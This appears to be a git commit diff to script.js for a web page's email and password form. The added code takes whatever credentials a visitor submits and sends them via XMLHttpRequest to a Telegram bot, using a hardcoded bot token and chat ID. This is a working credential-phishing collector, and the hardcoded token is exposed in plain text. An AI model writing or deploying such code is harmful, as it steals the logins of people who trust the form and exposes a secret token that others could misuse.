9280094abfd3381bc4f3bb79ae2bd71370d3f706
Abbos <norqulovabbos1701@gmail.com>
2024-04-01 23:42:27 +0500

    red

--- script.js
+++ script.js
@@ -3,31 +3,21 @@ const Email = document.querySelector("#email")
 const Password = document.querySelector("#pswd")
 
 const SendMessage = (e) => {
-    const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
     e.preventDefault()
 
  if (Email.value === "" || Password.value === " ") {
      alert("Malumotlarni to`liq kiriting")
  } 
  else {
-        // Email.value = ""  
-        // Password.value = ""
-
-        const text = `%0A 👦 Name: ${email.value}  %0A 👦 Surname:  ${password.value} `;
-        const chatId = -1002128588085;
-        const token = '6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM';
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=html`;
-        let api = new XMLHttpRequest();
+    text = ` %0A email : ${Email.value} %0A password : ${Password.value}`;
+   chat_id = -1002128588085
+   token = '6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM';
+   url =` https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`
+   let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-        setResult(true)
-        fetch(url)
-          .then((response) => response.json())
-          .then((data) => {
-            setPassword('');
-            setEmail('');
-            setMsg(true)
+        Email.value = ""  
+        Password.value = ""
  }
 }
 Form.addEventListener("submit" , SendMessage)
